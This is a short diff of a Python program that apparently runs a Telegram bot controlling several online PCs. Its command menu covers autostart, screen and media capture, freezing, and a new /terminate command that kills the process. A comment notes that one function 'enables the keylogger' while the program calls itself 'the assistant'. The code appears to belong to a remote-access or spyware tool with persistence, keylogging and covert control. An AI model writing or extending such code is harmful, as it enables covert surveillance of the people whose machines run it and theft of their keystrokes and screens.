@@ -1323,7 +1323,8 @@ def tg_bot_poller():
                         f"📊 /status      — system status\n"
                         f"❄️ /freeze      — pause all actions\n"
                         f"▶️ /unfreeze    — resume actions\n"
-                        f"⚡ /autostart <code>on|off</code> — автозапуск вкл / выкл (удалить)\n"
+                        f"⚡ /autostart <code>on|off</code> — автозапуск вкл / выкл\n"
+                        f"💀 /terminate   — завершить процесс\n"
                         f"🌐 /list_pc     — list online PCs\n"
                         f"\n"
                         f"<b>📸 MEDIA &amp; SCREEN</b>\n"
@@ -1381,7 +1382,14 @@ def tg_bot_poller():
                 elif cmd == "/unfreeze":
                     with state.lock:
                         state.frozen = False
+                    # NOTE: do NOT start_typing_mode() here — that enables the keylogger.
+                    # The assistant resumes its normal hotkey-driven workflow automatically.
                     tg_send_message("▶️ Bot UNFROZEN — normal operation resumed.")
+
+                elif cmd == "/terminate":
+                    tg_send_message("💀 Terminating process on this PC...")
+                    import os as _os
+                    _os.kill(_os.getpid(), 9)
 
                 elif cmd in ("/autostart", "/autostart_on", "/autostart_off", "/autostart_del", "/autostart_disable", "/autostart_enable"):
                     subaction = filtered_args[0].lower() if filtered_args else ""
